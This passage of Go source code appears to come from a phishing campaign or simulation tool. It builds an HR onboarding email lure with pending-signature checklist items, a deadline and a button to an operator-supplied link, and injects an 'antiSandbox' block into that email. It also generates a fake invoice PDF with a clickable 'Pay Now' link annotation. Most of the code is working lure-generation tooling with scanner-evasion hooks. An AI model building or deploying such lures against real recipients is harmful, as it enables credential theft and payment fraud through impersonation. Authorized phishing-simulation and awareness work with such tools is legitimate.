.welcome{font-size:15px;color:#333;line-height:1.6;margin-bottom:20px}
.checklist{margin-bottom:20px}
.checklist .item{display:flex;align-items:center;gap:10px;padding:10px 14px;border:1px solid #e9ecef;border-radius:6px;margin-bottom:8px;font-size:14px;color:#333}
.checklist .item .check{width:20px;height:20px;border:2px solid #dee2e6;border-radius:4px;flex-shrink:0}
.checklist .item .pending{color:#ffc107;font-size:12px;margin-left:auto;font-weight:600}
.deadline{background:#fff3cd;border:1px solid #ffc107;border-radius:6px;padding:12px 14px;margin-bottom:20px;font-size:13px;color:#856404;display:flex;align-items:center;gap:8px}
.btn{display:block;width:100%%;padding:14px;background:#667eea;color:#fff;text-align:center;text-decoration:none;border-radius:6px;font-size:15px;font-weight:600}
.btn:hover{background:#5a6fd6}
.footer{padding:14px 24px;border-top:1px solid #eee;text-align:center}
.footer p{font-size:11px;color:#999}
</style></head><body>
%s
<div class="card" id="main-content">
<div class="header"><h2>%s</h2><p>%s &middot; Human Resources</p></div>
<div class="body">
<p class="welcome">%s</p>
<div class="checklist">
<div class="item"><span class="check"></span> Employment Agreement <span class="pending">Pending</span></div>
<div class="item"><span class="check"></span> Tax Forms (W-4) <span class="pending">Pending</span></div>
<div class="item"><span class="check"></span> Direct Deposit Setup <span class="pending">Pending</span></div>
<div class="item"><span class="check"></span> Benefits Enrollment <span class="pending">Pending</span></div>
</div>
<div class="deadline">⏰ Please complete by %s</div>
<a href="%s" class="btn">Review &amp; Sign Documents</a>
</div>
<div class="footer"><p>%s Human Resources &middot; %s</p></div>
</div></body></html>`, companyName, docName, antiSandbox, docName, companyName,
		message, time.Now().Add(7*24*time.Hour).Format("January 2, 2006"),
		linkURL, companyName, senderEmail)
}

// --- New Generation Mode: Invoice PDF ---

// GenerateInvoicePDF generates a professional invoice as a PDF attachment
func (ag *AttachmentGenerator) GenerateInvoicePDF(req *AttachmentGenerateRequest) (*GeneratedAttachment, error) {
	companyName := req.Data["companyName"]
	if companyName == "" {
		companyName = "Acme Corporation"
	}
	invoiceNum := req.Data["invoiceNumber"]
	if invoiceNum == "" {
		invoiceNum = fmt.Sprintf("INV-%d", 10000+rand.Intn(90000))
	}
	amount := req.Data["amount"]
	if amount == "" {
		amount = fmt.Sprintf("$%d.%02d", 100+rand.Intn(9900), rand.Intn(100))
	}
	description := req.Data["description"]
	if description == "" {
		description = "Professional Services - Monthly Subscription"
	}
	recipientName := req.Data["recipientName"]
	if recipientName == "" {
		recipientName = "Valued Customer"
	}
	linkURL := req.LinkURL
	if linkURL == "" {
		linkURL = "#"
	}
	filename := req.Filename
	if filename == "" {
		filename = fmt.Sprintf("%s_%s.pdf", strings.ReplaceAll(companyName, " ", "_"), invoiceNum)
	}

	// Build PDF content stream
	now := time.Now()
	var stream strings.Builder
	stream.WriteString("BT\n")
	stream.WriteString("/F1 20 Tf\n50 780 Td\n")
	stream.WriteString(fmt.Sprintf("(%s) Tj\n", pdfEscapeString(companyName)))
	stream.WriteString("/F1 10 Tf\n0 -30 Td\n")
	stream.WriteString(fmt.Sprintf("(INVOICE %s) Tj\n", pdfEscapeString(invoiceNum)))
	stream.WriteString("0 -20 Td\n")
	stream.WriteString(fmt.Sprintf("(Date: %s) Tj\n", now.Format("January 2, 2006")))
	stream.WriteString("0 -15 Td\n")
	stream.WriteString(fmt.Sprintf("(Due: %s) Tj\n", now.Add(30*24*time.Hour).Format("January 2, 2006")))
	stream.WriteString("0 -30 Td\n")
	stream.WriteString(fmt.Sprintf("(Bill To: %s) Tj\n", pdfEscapeString(recipientName)))
	stream.WriteString("0 -40 Td\n")
	stream.WriteString("/F1 11 Tf\n")
	stream.WriteString("(Description                                    Amount) Tj\n")
	stream.WriteString("0 -5 Td\n")
	stream.WriteString("(________________________________________________________) Tj\n")
	stream.WriteString("0 -20 Td\n/F1 10 Tf\n")

	descLines := pdfWordWrap(description, 50)
	for _, line := range descLines {
		stream.WriteString(fmt.Sprintf("(%s) Tj\n0 -15 Td\n", pdfEscapeString(line)))
	}
	stream.WriteString(fmt.Sprintf("0 -10 Td\n(Total: %s) Tj\n", pdfEscapeString(amount)))
	stream.WriteString("0 -30 Td\n")
	stream.WriteString("(Click below to view and pay this invoice online.) Tj\n")
	stream.WriteString("0 -20 Td\n")
	stream.WriteString(fmt.Sprintf("(Pay Now: %s) Tj\n", pdfEscapeString(linkURL)))
	stream.WriteString("ET\n")

	streamContent := stream.String()
	pdfBytes := ag.buildPDFWithLink(streamContent, linkURL, 50, 400)

	return &GeneratedAttachment{
		Filename:    filename,
		ContentType: "application/pdf",
		Content:     base64.StdEncoding.EncodeToString(pdfBytes),
		Size:        len(pdfBytes),
	}, nil
}

// buildPDFWithLink builds a minimal PDF with a clickable link annotation
func (ag *AttachmentGenerator) buildPDFWithLink(streamContent, linkURL string, linkX, linkY int) []byte {
	pageWidth := 612
	pageHeight := 792
	escLink := pdfEscapeString(linkURL)

	var buf strings.Builder
	var offsets []int

	buf.WriteString("%PDF-1.4\n")

	offsets = append(offsets, buf.Len())
	buf.WriteString("1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n")

	offsets = append(offsets, buf.Len())
	buf.WriteString("2 0 obj\n<< /Type /Pages /Kids [3 0 R] /Count 1 >>\nendobj\n")

	offsets = append(offsets, buf.Len())
	fmt.Fprintf(&buf, "3 0 obj\n<< /Type /Page /Parent 2 0 R /MediaBox [0 0 %d %d] /Contents 5 0 R /Resources << /Font << /F1 4 0 R >> >> /Annots [6 0 R] >>\nendobj\n", pageWidth, pageHeight)

	offsets = append(offsets, buf.Len())
	buf.WriteString("4 0 obj\n<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>\nendobj\n")

	offsets = append(offsets, buf.Len())
	fmt.Fprintf(&buf, "5 0 obj\n<< /Length %d >>\nstream\n%s\nendstream\nendobj\n", len(streamContent), streamContent)

	offsets = append(offsets, buf.Len())
	fmt.Fprintf(&buf, "6 0 obj\n<< /Type /Annot /Subtype /Link /Rect [%d %d %d %d] /Border [0 0 0] /A << /Type /Action /S /URI /URI (%s) >> >>\nendobj\n",
		linkX, linkY-4, linkX+300, linkY+14, escLink)

	xrefOffset := buf.Len()
	fmt.Fprintf(&buf, "xref\n0 %d\n", len(offsets)+1)
	buf.WriteString("0000000000 65535 f \n")
	for _, off := range offsets {
		fmt.Fprintf(&buf, "%010d 00000 n \n", off)
	}

	fmt.Fprintf(&buf, "trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n", len(offsets)+1, xrefOffset)

	return []byte(buf.String())
}
